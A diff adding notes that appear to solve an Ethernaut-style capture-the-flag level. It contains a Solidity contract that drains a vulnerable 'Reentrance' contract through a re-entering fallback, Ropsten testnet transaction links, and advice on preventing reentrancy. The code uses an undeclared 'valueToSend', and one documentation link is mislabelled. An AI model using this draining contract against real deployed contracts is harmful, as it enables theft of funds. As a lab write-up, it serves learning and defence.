@@ -1,0 +1,72 @@
+Reentrancy =>       https://ropsten.etherscan.io/tx/0x5fcaa397084fed190d36206db928a68fd47b076919a5296f059848814f9514e8#internal
+                    https://ropsten.etherscan.io/tx/0xb2cafc9d72e43a03d8e1625e853bee742f3038f7ff6996da65e742eff6c034d6
+                    https://ropsten.etherscan.io/tx/0xe808f51f9a5fe4573e1c50c9bd41472e7869b4f4c81a13c9f98f5ff2e60fdd71#internal
+
+Self Destruct =>    https://ropsten.etherscan.io/tx/0x3cd7176c0fc47b3a5bba8e6071395cbf7e13226ba6ff056015f262a1fbc37d5a
+
+
+
+contract myAttack {
+
+    Reentrance public RE;
+    address payable public owner;
+    constructor(address payable _contractAddr) public payable{
+
+        owner = msg.sender;
+        RE = Reentrance(_contractAddr);
+
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+
+    function collect() public payable {
+
+        RE.donate.value(valueToSend)(address(this));
+        RE.withdraw(valueToSend);
+
+    }
+
+    function myBalance () public view returns (uint contractBalance) {
+        return address(this).balance;
+    }
+
+    function victimBal () public view returns (uint contractBalance) {
+        return address(RE).balance;
+    }
+
+    function() external payable {
+
+        if (address(RE).balance != 0) {
+
+            RE.withdraw(valueToSend);
+        }
+
+
+    }
+
+    function kill () public onlyOwner {
+        selfdestruct(msg.sender);
+    }
+
+}
+
+Before deploying, fund the contract with value <= valueToSend otherwise it will result in error
+`The called function should be payable if you send value and the value you send should be less than your current balance`
+
+
+In order to prevent re-entrancy attacks when moving funds out of your contract,
+use the Checks-Effects-Interactions pattern -- https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern
+being aware that call will only return false without interrupting the execution flow.
+
+Solutions such as ReentrancyGuard -- https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard
+or
+PullPayment -- https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard
+can also be used.
+
+transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork
+Source 1 -- https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/
+Source 2 -- https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742
+Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.
